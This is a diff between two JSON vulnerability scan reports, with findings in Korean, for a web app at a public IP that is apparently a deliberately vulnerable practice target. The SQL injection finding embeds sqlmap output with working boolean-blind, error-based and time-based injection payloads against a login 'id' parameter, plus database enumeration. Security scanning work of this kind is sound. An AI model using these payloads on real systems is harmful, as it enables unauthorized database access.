@@ -1,30 +1,20 @@
 {
-  "scan_id": "SCAN-20260515-054148",
+  "scan_id": "SCAN-20260516-072221",
   "target": "http://15.164.60.79",
   "scanner": "signature-based",
-  "generated_at": "2026-05-15T14:41:48+09:00",
+  "generated_at": "2026-05-16T16:22:21+09:00",
   "summary": {
-    "total": 10,
+    "total": 8,
     "severity": {
       "critical": 0,
       "high": 1,
-      "medium": 7,
+      "medium": 5,
       "low": 2
     }
   },
   "results": [
     {
       "id": "RES-0001",
-      "check_id": "WEB-A01-001",
-      "owasp": "A01:2025 Broken Access Control",
-      "name": "관리자 페이지 직접 접근",
-      "url": "",
-      "severity": "medium",
-      "evidence": "/vulnapp/admin.jsp 접근 가능, status=200",
-      "recommendation": "관리자 페이지에 인증 및 권한 검증 적용"
-    },
-    {
-      "id": "RES-0002",
       "check_id": "WEB-A01-002",
       "owasp": "A01:2025 Broken Access Control",
       "name": "IDOR로 타 사용자 정보 조회",
@@ -34,17 +24,17 @@
       "recommendation": "서버 측에서 요청 사용자와 자원 소유자 권한 검증"
     },
     {
-      "id": "RES-0003",
+      "id": "RES-0002",
       "check_id": "WEB-A02-001",
       "owasp": "A02:2025 Security Misconfiguration",
       "name": "보안 헤더 미설정",
       "url": "",
       "severity": "low",
-      "evidence": "CSP unsafe-inline 허용",
+      "evidence": "missing=['Content-Security-Policy', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy']",
       "recommendation": "필수 보안 헤더 적용 및 CSP nonce/hash 기반 설정"
     },
     {
-      "id": "RES-0004",
+      "id": "RES-0003",
       "check_id": "WEB-A02-002",
       "owasp": "A02:2025 Security Misconfiguration",
       "name": "서버 버전 노출",
@@ -54,7 +44,7 @@
       "recommendation": "서버 배너 제거 및 커스텀 에러 페이지 적용"
     },
     {
-      "id": "RES-0005",
+      "id": "RES-0004",
       "check_id": "WEB-A04-001",
       "owasp": "A04:2025 Cryptographic Failures",
       "name": "HTTPS 미적용",
@@ -64,7 +54,7 @@
       "recommendation": "HTTPS 적용 및 HTTP to HTTPS 리다이렉트 설정"
     },
     {
-      "id": "RES-0006",
+      "id": "RES-0005",
       "check_id": "WEB-A05-001",
       "owasp": "A05:2025 Injection",
       "name": "SQL Injection",
@@ -75,7 +65,7 @@
         "error_based": false,
         "auth_bypass": true,
         "redirected": true,
-        "redirect_location": "http://15.164.60.79/vulnapp/index.jsp",
+        "redirect_location": "http://15.164.60.79/vulnapp/admin.jsp",
         "login_failed_absent": true,
         "time_based": false,
         "delay": 0.01,
@@ -89,23 +79,13 @@
           "databases": [
             "hqCQEVsTQB"
           ],
-          "raw_tail": " is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 637 HTTP(s) requests:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 2591=(SELECT (CASE WHEN (2591=2591) THEN 2591 ELSE (SELECT 6439 UNION SELECT 9509) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1870,CONCAT(0x5c,0x716b717a71,(SELECT (ELT(1870=1870,1))),0x717a626a71)) AND 'iQFu'='iQFu&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4292 FROM (SELECT(SLEEP(5)))qotI) AND 'wLWJ'='wLWJ&pw=test\n---\n[05:41:48] [INFO] the back-end DBMS is MySQL\n[05:41:48] [INFO] fetching banner\n[05:41:48] [INFO] retrieved: 'hqCQEVsTQB'\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.28.3, JSP, Django\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: 'hqCQEVsTQB'\n[05:41:48] [INFO] fetching current user\n[05:41:48] [INFO] retrieved: 'hqCQEVsTQB'\ncurrent user: 'hqCQEVsTQB'\n[05:41:48] [INFO] fetching current database\n[05:41:48] [INFO] retrieved: 'hqCQEVsTQB'\ncurrent database: 'hqCQEVsTQB'\n[05:41:48] [INFO] testing if current user is DBA\n[05:41:48] [INFO] fetching current user\n[05:41:48] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[05:41:48] [INFO] fetching database names\n[05:41:48] [WARNING] it was not possible to count the number of entries for the SQL query provided. sqlmap will assume that it returns only one entry\n[05:41:48] [INFO] retrieved: 'hqCQEVsTQB'\navailable databases [1]:\n[*] hqCQEVsTQB\n\n[05:41:48] [INFO] fetched data logged to text files under '/home/ubuntu/.local/share/sqlmap/output/15.164.60.79'\n\n[*] ending @ 05:41:48 /2026-05-15/\n\n\n"
+          "raw_tail": "] testing connection to the target URL\nyou have not declared cookie(s), while server wants to set its own ('JSESSIONID=83C7826739B...FE8656E989'). Do you want to use those [Y/n] Y\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 2591=(SELECT (CASE WHEN (2591=2591) THEN 2591 ELSE (SELECT 6439 UNION SELECT 9509) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1870,CONCAT(0x5c,0x716b717a71,(SELECT (ELT(1870=1870,1))),0x717a626a71)) AND 'iQFu'='iQFu&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4292 FROM (SELECT(SLEEP(5)))qotI) AND 'wLWJ'='wLWJ&pw=test\n---\n[07:22:21] [INFO] the back-end DBMS is MySQL\n[07:22:21] [INFO] fetching banner\n[07:22:21] [INFO] resumed: 'hqCQEVsTQB'\nweb server operating system: Linux Ubuntu\nweb application technology: Django, JSP, Nginx 1.28.3\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: 'hqCQEVsTQB'\n[07:22:21] [INFO] fetching current user\n[07:22:21] [INFO] resumed: 'hqCQEVsTQB'\ncurrent user: 'hqCQEVsTQB'\n[07:22:21] [INFO] fetching current database\n[07:22:21] [INFO] resumed: 'hqCQEVsTQB'\ncurrent database: 'hqCQEVsTQB'\n[07:22:21] [INFO] testing if current user is DBA\n[07:22:21] [INFO] fetching current user\ncurrent user is DBA: False\n[07:22:21] [INFO] fetching database names\n[07:22:21] [WARNING] it was not possible to count the number of entries for the SQL query provided. sqlmap will assume that it returns only one entry\n[07:22:21] [INFO] resumed: 'hqCQEVsTQB'\navailable databases [1]:\n[*] hqCQEVsTQB\n\n[07:22:21] [INFO] fetched data logged to text files under '/home/ubuntu/.local/share/sqlmap/output/15.164.60.79'\n\n[*] ending @ 07:22:21 /2026-05-16/\n\n\n"
         }
       },
       "recommendation": "Prepared Statement 사용 및 입력값 검증"
     },
     {
-      "id": "RES-0007",
-      "check_id": "WEB-A05-002",
-      "owasp": "A05:2025 Injection",
-      "name": "Reflected XSS",
-      "url": "",
-      "severity": "medium",
-      "evidence": "검색 파라미터 q에 입력한 script 태그가 응답에 그대로 반영됨",
-      "recommendation": "출력 시 HTML Encoding 적용"
-    },
-    {
-      "id": "RES-0008",
+      "id": "RES-0006",
       "check_id": "WEB-A06-001",
       "owasp": "A06:2025 Insecure Design",
       "name": "로그인 Rate Limit 미구현",
@@ -115,7 +95,7 @@
       "recommendation": "로그인 실패 횟수 제한 및 지연 응답 적용"
     },
     {
-      "id": "RES-0009",
+      "id": "RES-0007",
       "check_id": "WEB-A06-002",
       "owasp": "A06:2025 Insecure Design",
       "name": "debug=true 기능 활성화",
@@ -125,7 +105,7 @@
       "recommendation": "운영 환경에서 debug 기능 비활성화"
     },
     {
-      "id": "RES-0010",
+      "id": "RES-0008",
       "check_id": "WEB-A07-001",
       "owasp": "A07:2025 Authentication Failures",
       "name": "계정 잠금 미구현",
